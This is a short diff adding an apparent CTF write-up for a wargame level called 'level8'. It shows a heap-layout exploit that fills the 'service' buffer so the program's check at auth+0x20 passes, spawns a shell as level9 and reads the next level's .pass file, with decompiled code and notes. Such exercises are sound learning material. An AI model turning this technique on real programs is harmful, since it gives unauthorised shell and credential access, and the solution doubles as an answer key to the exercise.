@@ -1,0 +1,26 @@
+./level8
+(nil), (nil)
+auth 
+0x804a008, (nil)
+serviceAAAAAAAAAAAAAAAA
+0x804a008, 0x804a018
+login
+$ whoami
+level9
+$ cd /home/user/level9
+$ cat .pass
+
+=> we need to override the memory 32 bits after auth
+(
+	eax = auth;
+    eax = *((eax + 0x20));
+    if (eax != 0) {
+        system ("/bin/sh");
+        goto label_0;
+    }
+)
+
+=>service is writted just after auth in the malloc memory
+so fill it with at least 16caracters
+(auth already took 16bits because malloc cannot allocat less)
+and we validate the condition to open a shell
